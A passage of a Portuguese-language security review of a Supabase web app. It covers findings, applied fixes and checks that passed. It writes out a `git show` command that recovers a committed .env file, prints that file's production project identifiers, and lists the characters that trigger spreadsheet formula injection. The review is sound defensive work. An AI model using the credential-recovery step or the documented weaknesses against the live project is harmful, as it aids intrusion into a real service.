(`supabase/migrations/20260731120000_content_moderation_v2042.sql`) bloqueia
palavrões, mas não tem nada a ver com sintaxe de fórmula — não protege aqui.

**Correção:** em `escape()`, prefixar com apóstrofo (`'`) qualquer célula cujo
primeiro caractere esteja em `= + - @ TAB CR`. É uma linha, mas fica em código
de exportação que prefiro não alterar sem que o dono valide o formato do
arquivo com quem o consome.

Relacionado: `admin_export_data(_kind => 'clients')` devolve sempre o conjunto
máximo de dados pessoais (e-mail, telefone, data de nascimento, cidade,
bairro), sem seleção de campos. Vale acrescentar um argumento de escopo para
que a exportação rotineira não carregue e-mail e telefone quando não precisa.

### M11 — Autoria e datas enviadas pelo cliente sobrescrevem o que o servidor já deriva

**Confiança: confirmado.**

Três lugares mandam do navegador valores que o banco já preenche sozinho:

- `src/components/admin/management-dashboard.tsx:376-377` e `:406-407` —
  `created_by` / `updated_by` de `pilot_runs` são declarados
  `DEFAULT auth.uid()` em
  `supabase/migrations/20260716123000_management_metrics_pilot.sql:23-24`, mas o
  cliente envia `currentUserId` explicitamente, sobrepondo o padrão do servidor
  e alimentando o gatilho de auditoria com um ator escolhido pelo cliente.
  `started_at` / `ended_at` usam o relógio do notebook do administrador em vez
  de `now()`.
- `src/components/admin/admin-panel.tsx:3675` é o mais grave dos três:
  `created_by: currentUserId` está no payload usado **tanto para inserir quanto
  para atualizar** (linha 3680). Editar a publicação de outra pessoa no feed
  reescreve a autoria para o administrador atual, apagando quem realmente
  escreveu.

Nenhum destes é escalonamento de privilégio — todos exigem ser admin. O dano é
na confiabilidade da auditoria e do histórico, que é justamente o que se quer
poder consultar depois de um incidente no piloto.

**Correção:** remover esses campos dos payloads e deixar os `DEFAULT` e
gatilhos do banco preencherem. `created_by` deve ficar fora do caminho de
`update` por completo.

### M12 — O seletor de locais reconstrói o Autocomplete do Google a cada tecla

**Confiança: confirmado.**

`src/components/admin/venue-picker.tsx:100-137`. O efeito depende de
`onSelected`, e `VenueDialog` passa uma função anônima inline
(`src/components/admin/admin-panel.tsx:1743`). Como o diálogo re-renderiza a
cada caractere digitado, o efeito é desmontado e **um novo
`google.maps.places.Autocomplete` é construído a cada tecla**.

A limpeza só chama `listener.remove()`: o widget não é desanexado e o
`.pac-container` que o Google acrescenta ao `document.body` nunca é removido.
Acumulam-se listas suspensas órfãs e instâncias faturáveis do Autocomplete —
o que aparece como custo na conta do Google Cloud.

No mesmo arquivo, `window.__bafafaGoogleMapsLoader` (linha 61) guarda em cache
a promessa **rejeitada**: uma única falha de rede desativa a busca de locais
até recarregar a página inteira.

**Sobre a chave** (`venue-picker.tsx:81, 95`): `VITE_GOOGLE_MAPS_API_KEY` é
embutida no pacote JavaScript pelo Vite e vai na URL do script — isso é
inevitável para a API JavaScript do Maps, e a interface só imprime o **nome** da
variável (linha 193), nunca o valor. Não há vazamento adicional no código. A
proteção tem de vir da configuração: **confirme antes do piloto** que a chave
tem restrição de referenciador HTTP fixada no domínio de produção **e**
restrição de API para Maps JavaScript + Places apenas. Uma chave sem restrição
extraída do pacote é prejuízo direto na fatura.

**Correção:** envolver `onSelected` em `useCallback` no `VenueDialog` (ou
guardá-la em `ref` e tirá-la das dependências), e limpar
`window.__bafafaGoogleMapsLoader` no `.catch` para permitir nova tentativa.

### M13 — O avatar recém-enviado é apagado mesmo quando o perfil salvou — **corrigido**

**Confiança: confirmado.**

`src/routes/_authenticated/perfil.tsx:296-338`. O `UPDATE` de `profiles` e a RPC
`set_my_preferences` rodam juntos num `Promise.all`, e a limpeza era feita se
**qualquer um dos dois** falhasse:

```ts
if (profileError || prefsError) {
  if (uploadedAvatarUrl) await removePublicImage("avatars", uploadedAvatarUrl);
  throw profileError ?? prefsError ?? new Error("Não foi possível salvar.");
}
```

Quando o perfil salva mas as preferências falham — e `set_my_preferences`
levanta exceção para mais de 20 preferências ou valores acima de 80 caracteres
(`supabase/migrations/20260719120000_auth_privileged_v16.sql:191`), além de
qualquer erro transitório — o arquivo é removido do storage **enquanto
`profiles.avatar_url` já aponta para ele**. O avatar fica quebrado de forma
permanente e a pessoa só vê "Não foi possível salvar."

**Corrigido** — ver "Correções aplicadas".

### M14 — `event.currentTarget` usado depois de `await` em dois formulários — **corrigido**

**Confiança: confirmado.**

`src/components/admin/commercial-dashboard.tsx:435` (produtos) e `:818` (metas
coletivas). O React zera `event.currentTarget` assim que o handler síncrono
retorna; como os dois handlers são `async` e têm `await`, a chamada
`event.currentTarget.reset()` lança `TypeError` — **depois** de `toast.success`
e **antes** de `onSaved()`.

O operador vê "Produto criado", mas o catálogo nunca recarrega e o formulário
mantém os valores antigos — convidando a salvar duas vezes o mesmo produto.

**Corrigido** — ver "Correções aplicadas".

Nota relacionada, **não corrigida**: no mesmo handler, a RPC
`admin_upsert_product` (que grava o histórico de preço) é confirmada primeiro e
o `UPDATE` seguinte das regras (`active`, `discount_eligible`,
`max_discount_cents`) é uma escrita separada e não transacional
(`commercial-dashboard.tsx:417-430`). Se a segunda falhar, a mudança de preço
já está valendo e o operador só vê o erro. O certo é mover as regras para
dentro de `admin_upsert_product`.

### M15 — O limite superior da exportação é congelado na montagem do painel — **corrigido**

**Confiança: confirmado.**

`src/components/admin/management-dashboard.tsx:138`:

```ts
const toDate = useMemo(() => new Date(), []);
```

Com lista de dependências vazia, esse valor **nunca é atualizado**. Ele é usado
tanto no cálculo das métricas (linha 147) quanto como limite `_to` da
exportação (linha 335).

Numa noite de piloto o painel fica aberto por horas: todo check-in, mimo e
cadastro criado após o carregamento da página fica de fora do funil, dos
cartões de progresso e do CSV — enquanto a notificação da linha 341 informa com
confiança "N linha(s) exportada(s)". O dono exporta o resultado da noite e
recebe um arquivo truncado sem nenhum aviso.

**Corrigido apenas na exportação** — ver "Correções aplicadas". Os cartões de
métrica continuam com o valor congelado.

---

## Baixo

### B1 — `.env` esteve versionado, mas continha apenas a chave pública

**Confiança: confirmado — severidade menor do que aparenta.**

O arquivo `.env` existe no histórico do Git (adicionado em `d61a952`, removido
em `280ffc1`) e ainda é recuperável com `git show d61a952:.env`. Conteúdo:

```
SUPABASE_PROJECT_ID="xculwvekfctuqdogdaec"
SUPABASE_PUBLISHABLE_KEY="sb_publishable_..."
SUPABASE_URL="https://xculwvekfctuqdogdaec.supabase.co"
(+ os mesmos três com prefixo VITE_)
```

**São apenas a URL e a chave *publishable*.** Não há `service_role`, nem
`sb_secret_`, nem chave de terceiros. A chave publishable é projetada para ser
pública e já vai no pacote JavaScript entregue ao navegador — expô-la não
concede nada além do que qualquer visitante já tem.

Não recomendo rotacionar nem reescrever o histórico (o repositório é conectado
ao Lovable e reescrever histórico destrói o projeto do dono). O `.gitignore`
atual já cobre `.env` e `.env.*`.

O ponto que **de fato** importa: isso confirma publicamente o *project ref* de
produção. Como o aplicativo não tem backend, **RLS é a única defesa** — e ela
está exposta a qualquer pessoa que queira testá-la. É mais um argumento para
tratar os achados de RLS acima com seriedade, não um incidente de credencial.

### B2 — O código curto do QR usa `random()`, que não é criptográfico

**Confiança: confirmado.**

`supabase/migrations/20260728120000_simplificacao_experiencia_v202.sql:647`:

```sql
v_code := lpad((floor(random() * 1000000))::integer::text, 6, '0');
```

`random()` do PostgreSQL não é um gerador criptográfico e seu estado é
previsível a partir de saídas observadas. O espaço é de 10⁶ e o código vive
poucos minutos.

O risco real é **pequeno**, e vale registrar por quê: o replay está bem
tratado (`used_at` gravado sob `FOR UPDATE`,
`20260722120000_...:466-468, 506-508`), tokens anteriores são invalidados
(`...v202.sql:642-643`), e consumir um código exige papel `equipe` ou `admin`.
Então um cliente não consegue forjar presença. O resíduo é um funcionário
mal-intencionado adivinhar o código de resgate de outro cliente dentro da
janela.

**Correção:** trocar por `gen_random_bytes()` (`pgcrypto`) numa migration nova.

### B3 — `validate_checkin_qr` registra a divergência de evento, mas não recusa

**Confiança: confirmado — provavelmente intencional.**

Em `supabase/migrations/20260722120000_navigation_feed_geolocation_v19.sql:474`
a função calcula `v_selected_mismatch` comparando o evento escolhido pela
equipe na tela com o evento gravado no token do cliente, e apenas **anota** o
resultado no log de auditoria (`:525`) e na resposta (`:542`). O check-in é
registrado no evento do **token**, não no selecionado.

Confiar no token é a decisão correta. O problema é que
`src/routes/_authenticated/staff/checkin.tsx:206-213` não usa
`selected_event_mismatch` para nada — a equipe vê "Check-in validado" e o nome
do evento correto, mas sem destaque de que não é o evento que ela escolheu no
seletor. Numa noite com dois eventos cadastrados, isso gera confusão de
contagem.

**Correção:** exibir um aviso na tela quando `selected_event_mismatch` for
verdadeiro. É mudança de interface, fora do escopo desta revisão.

### B4 — A moderação no cliente falha aberto, mas o banco segura

**Confiança: confirmado — risco residual mínimo.**

`src/lib/content-moderation.ts:23` devolve `"unavailable"` quando a RPC falha,
e **todos** os pontos de chamada só barram o valor `"blocked"` — por exemplo
`src/routes/auth.tsx:303`, `src/routes/_authenticated/perfil.tsx:280`,
`src/routes/_authenticated/resenha.tsx:380`. Um erro de rede na verificação,
portanto, deixa o texto passar.

Registro isto como **baixo** e não como falha aberta séria porque a moderação
está corretamente duplicada no banco: os gatilhos
`profiles_moderate_insert_v2042`, `profiles_moderate_update_v2042`,
`event_chat_moderate_content_v2042`, `private_chat_moderate_content_v2042` e
`salve_moderate_content_v2042`
(`supabase/migrations/20260731120000_content_moderation_v2042.sql:234-257`)
rejeitam o conteúdo de qualquer forma. Essa é exatamente a arquitetura certa —
a verificação no cliente é só para dar mensagem bonita antes de enviar.

O efeito residual é de experiência: em vez da mensagem amigável, o usuário
recebe a exceção do gatilho (que, por sorte, também está em português e passa
por `publicErrorMessage` sem ser filtrada).

**Correção sugerida (opcional):** tratar `"unavailable"` como bloqueio nos
campos de cadastro, ou ao menos avisar que a verificação não pôde ser feita.

### B5 — Código morto que confunde a leitura de segurança

**Confiança: confirmado.**

- `src/components/customer/customer-journey.tsx` e
  `src/components/customer/fofocometro-card.tsx` — não importados por nenhum
  arquivo (ver M1).
- `src/components/ui/chart.tsx` — não importado; único `dangerouslySetInnerHTML`
  do projeto (ver M5).
- `public.require_privileged_aal2()`
  (`supabase/migrations/20260802120000_privileged_aal2_enforcement_v206.sql:68`)
  — sem nenhum ponto de chamada, e o nome promete uma verificação de papel que
  ela não faz (ver A4).
- `v_claimed_over18` em `handle_new_user()`
  (`supabase/migrations/20260729120000_pilot_readiness_v204.sql:235`) — a
  variável é calculada a partir do que o cliente declarou e depois **nunca é
  usada**. Isso na verdade é a decisão **correta**: o `INSERT` usa
  `v_is_adult`, derivado da data de nascimento (`:240-241`). Vale um comentário
  explicando, para que ninguém "conserte" isso mais tarde passando a confiar na
  declaração do cliente.
- A política `"Staff insert checkins"`
  (`supabase/migrations/20260714122942_...:116-118`) nunca teve `GRANT INSERT`
  correspondente para `authenticated`, então é inerte.

### B6 — `campaigns` legível por `anon` expõe campos comerciais internos

**Confiança: a confirmar** — o `GRANT` é anterior ao escopo revisado e não
consegui confirmar a política vigente em produção.

A tabela `campaigns` tem `GRANT SELECT ... TO anon` com política de
`status = 'active'`. As colunas acrescentadas na v20
(`supabase/migrations/20260726120000_crm_funil_comercial_v20.sql`) —
`progression_rule`, `used_count`, `discount_max_cents`, `discount_value` — mais
as já existentes `internal_rules` e `total_available` passaram a ser legíveis
por visitantes não autenticados junto com o resto da linha.

Não é dado pessoal, mas é inteligência comercial: teto de desconto, quantidade
restante e regra interna de progressão da campanha.

**Correção:** `REVOKE SELECT ON public.campaigns FROM anon` e servir a vitrine
pública pelas RPCs que já existem, que devolvem só as colunas necessárias.

### B7 — Botões que travam para sempre por falta de `finally`

**Confiança: confirmado.**

- `src/routes/_authenticated/resenha.tsx:367-373` — `refreshChat` não tem
  `try/finally`. `fetchChatRooms` **lança** quando `my_event_chat_rooms` ou
  `my_house_session` falha (linhas 119-120), então `setRefreshing(false)`
  nunca executa: o botão de atualizar fica desabilitado, com o ícone girando,
  até a tela ser remontada. Como é chamado via `void refreshChat()` (linha
  600), a rejeição também fica sem tratamento. E quando só o recarregamento das
  mensagens falha, o erro é engolido (`quiet=true`, linha 296) mas a linha 372
  ainda avisa "Resenha atualizada".
- `src/routes/_authenticated/resenha.tsx:375-396` e `:506-530` — `sendMessage`
  e `sendPrivateMessage` também não têm `finally`. Se
  `checkCommunityContent` rejeitar, `sending` fica `true` para sempre e o
  cliente não consegue mais mandar mensagem, sem ver erro nenhum.

**Correção:** envolver os três corpos em `try { … } finally { setX(false) }`,
e mover o aviso de sucesso para dentro do `try`.

### B8 — Erros silenciosamente descartados em três telas

**Confiança: confirmado.**

- `src/routes/_authenticated/carteira.tsx:25-34` — `const { data } = await …`
  descarta o `error`. Se a leitura do perfil falhar, o cartão mostra os padrões
  `"Bafafã"` / `"Bafafã novo"` **como se fossem reais**, e a equipe no balcão vê
  um nome errado ao lado de um QR válido.
- `src/routes/_authenticated/mimos.tsx:93` —
  `await supabase.rpc("refresh_my_reward_statuses")` ignora o retorno. Se
  falhar, mimos já expirados continuam aparecendo em "Disponíveis"; o cliente
  toca em usar e a RPC responde `'Fofoquinha indisponível.'` na frente da
  equipe. O chamador da linha 164 já sabe renderizar o erro — basta propagá-lo.
- `src/routes/auth.tsx:632-643` — o roteamento pós-login descarta os `error` de
  `user_roles` e do AAL. Se a consulta de papéis falhar, `roles` vira `null`,
  `needsSecurity` vira `false` e uma conta privilegiada é mandada para
  `/inicio` em vez de `/seguranca` — **falha aberta**. Na prática é inofensivo,
  porque `src/routes/_authenticated/route.tsx:15-25` reexecuta
  `inspectPrivilegedSession` e redireciona de qualquer jeito. É um caminho
  redundante que dá a resposta errada, não um desvio real. O mais simples é
  apagar esse bloco e deixar a guarda do `_authenticated` decidir sozinha.

### B9 — `publicErrorMessage` deixa passar alguns textos crus do Postgres

**Confiança: confirmado.**

`src/lib/public-error.ts:37-39` funciona por **exclusão**: qualquer mensagem
com até 240 caracteres que não bata com `TECHNICAL_PATTERNS` é repassada ao
usuário. Escapam, por exemplo,
`value too long for type character varying(80)`,
`invalid input value for enum …` e `numeric field overflow` — que chegam à tela
por `perfil.tsx:245/369`, `resenha.tsx:391` e `mimos.tsx:165`.

**Correção sugerida:** inverter a política para `PostgrestError`
especificamente — repassar a mensagem apenas quando o erro não tiver `code`, ou
quando o `code` for `P0001` (que é o `RAISE EXCEPTION` das RPCs do próprio
projeto, já escritas em português para o usuário). Todo o resto cai no texto
padrão. Não apliquei porque muda o texto exibido em muitas telas e merece uma
passada de teste manual.

### B10 — `FormData.get()` com `??` não faz o que parece

**Confiança: confirmado.**

`FormData.get()` devolve `""` para um campo esvaziado — **nunca `null`**. Logo,
o padrão `?? valor` usado em `src/components/admin/commercial-dashboard.tsx`
nunca entra em ação quando o operador limpa o campo:

- `commercial-dashboard.tsx:811` — `Number(form.get("target") ?? 100)` vira
  `Number("") === 0`. A meta coletiva é criada com `target_count: 0`, que o
  Fofocômetro trata como concluída de imediato (o
  `Math.max(goal.target_count, 1)` da linha 861 só disfarça na exibição).
- `commercial-dashboard.tsx:810` — `name` degrada para `""` do mesmo jeito.
- `commercial-dashboard.tsx:573-583` — percentuais do funil seguem sem limite:
  nada impede um `stage2_discount_percent` de 500 chegar a
  `admin_configure_event_funnel`.

Note ainda que essa criação de meta escreve direto na tabela com
`status: "active"` escolhido pelo cliente (linha 813), sem passar por RPC.

**Correção:** validar antes de enviar (`Number(...) || 100` com verificação de
`> 0`, percentuais limitados a 0-100) e mover a criação de meta para uma RPC
administrativa que defina o `status` por conta própria.

### B11 — Pequenos ruídos operacionais no painel

**Confiança: confirmado.**

- `src/components/admin/admin-panel.tsx:191` —
  `await supabase.rpc("sync_event_statuses")` descarta o resultado. Se falhar,
  o painel abre exibindo status de evento desatualizados **sem nenhum sinal**.
- `src/components/admin/admin-panel.tsx:795-800` — o diálogo da Sessão da Casa
  sempre envia `status: "published"` no `update`. Editar uma sessão que
  `closeSession()` (linha 588) tinha marcado como `"ended"` a **reabre em
  silêncio**.
- `src/components/admin/admin-panel.tsx:1014-1023` — depois de
  `duplicate_event_with_campaigns`, o `setTimeout(…, 0)` procura o novo id
  dentro da prop `events` capturada pelo closure, que por definição não pode
  conter uma linha criada há um instante. O caminho "abrir a cópia para editar"
  é código morto.
- `src/components/admin/management-dashboard.tsx:122-127` — `loadPilots` chama
  `setEventId(first.event_id)`, trocando em silêncio o filtro global do painel
  de "Todos os eventos" para o evento do piloto mais recente. Os números
  parecem globais mas estão filtrados — e isso também restringe o
  `_event_id` da exportação.
- `src/components/admin/management-dashboard.tsx:339-341` — quando não há
  linhas, aparecem duas notificações contraditórias: "sem linhas" e, logo
  depois, "0 linha(s) exportada(s)".
- `src/components/ui/image-upload-field.tsx:50-56` — "Remover" confunde
  cancelar com apagar: quem já tem avatar, escolhe um arquivo novo e desiste
  recebe `null`, que `perfil.tsx:292-294` interpreta como *apagar meu avatar* —
  e o arquivo antigo é removido do storage ao salvar.

### B12 — Mensagens cruas do banco exibidas ao usuário — **corrigido**

**Confiança: confirmado.**

Três pontos exibiam o texto do erro do Postgres/PostgREST diretamente na tela,
contornando `publicErrorMessage()` — que é o padrão aplicado em todo o resto do
projeto. Isso vaza códigos `PGRST`, mensagens de RLS ("permission denied for
table…") e nomes de coluna:

- `src/components/admin/admin-panel.tsx:279` — `setError(firstError.message)`,
  renderizado cru na linha 372, no painel administrativo.
- `src/components/admin/admin-panel.tsx:1050-1052` —
  `checkins.error?.message` direto no `toast.error`.
- `src/routes/fofocometro/$eventId.tsx:31` — o mais sensível dos três, por ficar
  numa tela **pública, não autenticada e projetada no telão da casa**.

**Corrigidos os três** — ver "Correções aplicadas".

---

## Correções aplicadas

Mantive as alterações no mínimo, conforme combinado: nada de reestruturação,
nada de interface, e **nenhuma migration já aplicada foi modificada**. Todas as
demais recomendações ficaram como texto porque exigem migration nova, mudança
de interface ou configuração no painel do Supabase.

Depois das correções: `npx vitest run` (31 testes), `npx tsc --noEmit` e
`npx eslint .` continuam passando, sem erros novos.

### 1. `src/routes/_authenticated/carteira.tsx` — laço infinito de chamadas (A6)

O problema é descrito em A6. A correção tira `generating` das dependências do
`useCallback`, movendo o controle de "em andamento" para um `ref` — assim
`generate` passa a ter identidade estável e deixa de realimentar o efeito. Um
segundo `ref` garante **uma única tentativa automática**; se ela falhar, o
botão manual "Gerar minha carteirinha" (que já existia, linhas 86-92) assume,
em vez de a tela tentar sozinha para sempre.

```ts
const generatingRef = useRef(false);
const autoGenerateTriedRef = useRef(false);

const generate = useCallback(async () => {
  if (generatingRef.current) return;
  generatingRef.current = true;
  setGenerating(true);
  try {
    // ... chamada da RPC, sem alteração de comportamento
  } finally {
    generatingRef.current = false;
    setGenerating(false);
  }
}, []);

useEffect(() => {
  // Uma única tentativa automática. Se falhar, o botão manual assume.
  if (loading || token || autoGenerateTriedRef.current) return;
  autoGenerateTriedRef.current = true;
  void generate();
}, [generate, loading, token]);
```

O `try/finally` também garante que o estado seja liberado caso a RPC rejeite,
o que antes deixaria o botão travado.

### 2. `src/components/admin/admin-panel.tsx` — guarda de exclusão falhando aberto (A7)

Contagem indeterminada (`count === null`) agora é tratada como "tem
dependências", que é o lado seguro: o evento é apenas cancelado e o histórico
preservado, em vez de ser apagado em cascata.

```ts
// A exclusão é em cascata (chat, avaliações, sessões, metas). Quando a
// contagem vem nula não dá para afirmar que o evento está vazio, então o
// caminho seguro é apenas cancelar e preservar o histórico.
const hasDependents =
  checkins.count === null ||
  campaigns.count === null ||
  checkins.count > 0 ||
  campaigns.count > 0;
if (hasDependents) {
```

A verificação continua incompleta (não cobre todas as tabelas em cascata) —
isso exige uma RPC nova e ficou como recomendação em A7.

### 3. `src/routes/_authenticated/perfil.tsx` — avatar apagado após salvamento bem-sucedido

Quando o `UPDATE` do perfil funcionava mas a RPC `set_my_preferences` falhava,
o código apagava do storage a imagem recém-enviada — **enquanto
`profiles.avatar_url` já apontava para ela**. Resultado: avatar permanentemente
quebrado, e o usuário só via "Não foi possível salvar."

```ts
// Só apaga a imagem recém-enviada quando o próprio perfil falhou. Se
// apenas as preferências falharam, o perfil já aponta para essa URL e
// remover o arquivo deixaria o avatar quebrado de forma permanente.
if (uploadedAvatarUrl && profileError) {
  await removePublicImage("avatars", uploadedAvatarUrl);
}
```

### 4. `src/components/admin/commercial-dashboard.tsx` — `event.currentTarget` após `await`

Em dois formulários (produtos, linha 403; metas coletivas, linha 804) o
`event.currentTarget.reset()` era chamado depois de `await`. O React zera
`currentTarget` assim que o handler síncrono retorna, então a chamada lançava
`TypeError` — **depois** do `toast.success` e **antes** do `onSaved()`. O
operador via "Produto criado", o catálogo nunca recarregava e o formulário
ficava com os valores antigos.

A correção guarda o elemento antes do primeiro `await`:

```ts
// O React zera event.currentTarget quando o handler retorna. Como este
// handler tem await, o elemento precisa ser guardado antes.
const formElement = event.currentTarget;
const form = new FormData(formElement);
// ...
formElement.reset();
```

### 5. `src/components/admin/management-dashboard.tsx` — exportação truncada em silêncio

`toDate` é criado com `useMemo(() => new Date(), [])`, ou seja, **congelado na
montagem do painel**. Numa noite de piloto a tela fica aberta por horas, e o
limite superior da exportação continuava sendo o instante em que a página
carregou: tudo o que acontecesse depois ficava de fora do CSV, enquanto a
notificação da linha 341 informava com confiança o número de linhas exportadas.

```ts
// toDate é fixado na montagem do painel. Numa noite de piloto a tela fica
// aberta por horas, então o limite superior da exportação precisa ser o
// instante da exportação, senão o arquivo sai truncado sem avisar.
_to: new Date().toISOString(),
```

Corrigi apenas a exportação, que produz um arquivo do qual o dono vai depender.
Os cartões de métrica na tela usam o mesmo `toDate` congelado e continuam
subestimando os números da noite — corrigir isso exige um tique de
recomputação, que é mudança de comportamento visível e ficou de fora.

### 6. `src/components/admin/admin-panel.tsx` — mensagens cruas do banco na tela

Dois pontos exibiam o texto do erro do Postgres/PostgREST diretamente ao
operador, contornando `publicErrorMessage()` (usado em todo o resto do arquivo)
e vazando códigos `PGRST`, mensagens de RLS e nomes de coluna:

- linha 279, `setError(firstError.message)`, renderizado cru na linha 372;
- linhas 1050-1052, `checkins.error?.message` direto no `toast.error`.

Ambos passaram a usar `publicErrorMessage` com texto padrão em português.

### 7. `src/routes/fofocometro/$eventId.tsx` — erro cru do banco no telão público

A tela do Fofocômetro é pública, não autenticada, e fica **projetada no telão
da casa**. Ela era o único ponto do aplicativo que renderizava a mensagem de
erro do Postgres/PostgREST diretamente na tela, sem passar por
`publicErrorMessage()`:

```ts
// antes
if (loadError) setError(loadError.message);
```

Além do vazamento de detalhe técnico (nome de função, código `PGRST`, estrutura
do schema) para qualquer pessoa no salão, o resultado visual é péssimo num
telão. Como a tela recarrega a cada 5 segundos
(`src/routes/fofocometro/$eventId.tsx:41`), um erro persistente ficaria piscando
a mensagem técnica a noite toda.

```ts
// depois
// Esta tela é pública e fica projetada na casa. Nunca exibir a mensagem
// técnica crua do Postgres/PostgREST no telão.
if (loadError)
  setError(publicErrorMessage(loadError, "Não foi possível atualizar o Fofocômetro agora."));
```

`publicErrorMessage` (`src/lib/public-error.ts`) já é o padrão do projeto e
está aplicado em todos os outros pontos; esta foi a única exceção.

---

## Sugestão de ordem de trabalho antes do piloto

1. **C1** — rodar a consulta de diagnóstico em `pg_indexes` e padronizar as
   duas funções de concessão de mimo. É o único achado que trava a portaria.
2. **A1** — remover o gatilho órfão `checkins_refresh_milestones_v19`. Uma
   linha, e restaura a blindagem do check-in que já havia sido escrita.
3. **A4** — cadastrar e verificar TOTP em dois admins e em todas as contas
   `equipe`, e criar a RPC de emergência. Sem isso, há risco de ninguém
   conseguir operar na primeira noite.
4. **A5** — configurar o Turnstile e os limites de SMS, e **M12** — confirmar a
   restrição da chave do Google Maps. Os dois são custo direto em dinheiro.
5. **A3** — revogar escrita direta em `event_reviews`, para que os números do
   piloto sejam confiáveis.
6. **A2** — decidir a regra de negócio: check-in por geolocalização não deve
   conceder mimo nem abrir conversa privada durante o piloto.
7. **M2** — travar os campos de preço e custo na tela da equipe, senão o caixa
   trava e o painel de segurança enche de alertas falsos logo na primeira noite.
8. **M8** — pedir confirmação ao conceder papel `admin`.
9. **M1, M3, M9, M10** — armadilhas, indicadores mentirosos e ruído
   operacional; resolver na sequência.

## O que foi verificado e está correto

Vale registrar, porque foi bastante coisa e o resultado é bom:

- **RLS habilitado em todas as tabelas** criadas no repositório. Nenhuma ficou
  descoberta.
- **`search_path` fixo em todas as funções `SECURITY DEFINER`** — não há
  vetor de sequestro de `search_path`, ainda mais com `CREATE` revogado no
  schema `public` (`20260718120000_security_base_v15.sql:13`).
- **`profiles` está bem trancado**: `anon` não lê a tabela crua
  (`v15:23`), `authenticated` só lê o próprio perfil e o admin lê todos
  (`v15:57-63`), e o `GRANT UPDATE` é **por coluna** (`v15:30-46`), excluindo
  `phone_verified_at`, `is_over_18`, `member_since` e `deleted_at`. Perfis
  públicos saem só por `get_public_profile()`.
- **`handle_new_user()` não confia no cliente**: o papel inserido é sempre
  `'gratuito'` (fixo, sem possibilidade de injeção) e `is_over_18` é
  **derivado** da data de nascimento, não copiado da declaração do usuário
  (`20260729120000_pilot_readiness_v204.sql:240-241`).
- **Escritas sensíveis revogadas de `authenticated`**: `checkins`,
  `user_rewards`, `qr_tokens`, `sales`, `sale_items` só aceitam `SELECT`.
  Não existe caminho para o usuário se auto-conceder mimo, ponto ou presença.
- **Replay de QR está corretamente tratado** — `FOR UPDATE` + `used_at` na
  mesma transação, e `UNIQUE (user_id, event_id)` em `checkins` impede
  check-in duplicado mesmo sob concorrência.
- **`record_customer_sale` deixou de confiar em preço e custo do cliente**
  (`20260803143000_...`), com registro de tentativa de adulteração. É a
  correção certa (o problema é só a interface, ver M2).
- **Moderação de conteúdo aplicada por gatilho no banco**, não apenas no
  cliente (`20260731120000_content_moderation_v2042.sql`).
- **Cabeçalhos de segurança bem cobertos**: CSP, HSTS,
  `frame-ancestors 'none'`, `object-src 'none'`, `Permissions-Policy`
  restritiva, `X-Robots-Tag` de piloto e `Cache-Control: no-store` nas rotas
  autenticadas.
- **A verificação de AAL2 não é burlável pelo navegador** — só lê claims
  assinadas, e não achei caminho de contorno.
- **Não há IDOR nas telas do cliente.** Todo id enviado pelo navegador é
  revalidado no servidor contra `auth.uid()`: `create_my_qr_token`
  (`ur.user_id = v_user`), `delete_event_chat_message`,
  `report_event_chat_message`, `set_event_chat_block` (recusa bloquear a si
  mesmo), `send_event_chat_message` via `can_access_event_chat`, e o `UPDATE`
  de `profiles` por `.eq("id", user.id)` somado à RLS. Também verifiquei a
  leitura direta de `private_chat_messages` em `resenha.tsx:490-495`: está
  coberta pela política de membros da conversa.
- **A verificação de maioridade no cliente é só enfeite — e tudo bem.**
  `isAdultBirthDate` em `auth.tsx:1076` é conveniência; o valor que vale é
  recalculado no servidor a partir da data de nascimento, tanto no cadastro
  quanto na edição do perfil.
- **`active_title_id` tem gatilho de posse**, então a escrita em
  `perfil.tsx:312` não consegue reivindicar um título não conquistado.
- **`friendlyAuthError`** (`src/lib/auth-security.ts:158`) funciona por lista
  branca com texto padrão no final, então o `auth.tsx` não vaza mensagem crua
  do GoTrue.
- **Os filtros de escrita do painel estão todos corretos.** Conferi cada
  `.delete()` e `.update()`: `user_roles`, `campaigns`, `events`, `feed_posts`,
  `products` e `pilot_runs` filtram por id, e `restoreAutomaticOrder`
  (`admin-panel.tsx:2293-2299`) usa `.in("id", …)` atrás de uma confirmação.
- **`validateImageFile` / `prepareImageForUpload`** (`src/lib/storage.ts`)
  conferem os *magic bytes* do arquivo contra o `Content-Type` declarado,
  limitam dimensões e reconvertem tudo para WebP — não dá para subir um
  arquivo disfarçado de imagem. O nome da pasta é higienizado
  (`storage.ts:44`), sem travessia de caminho.
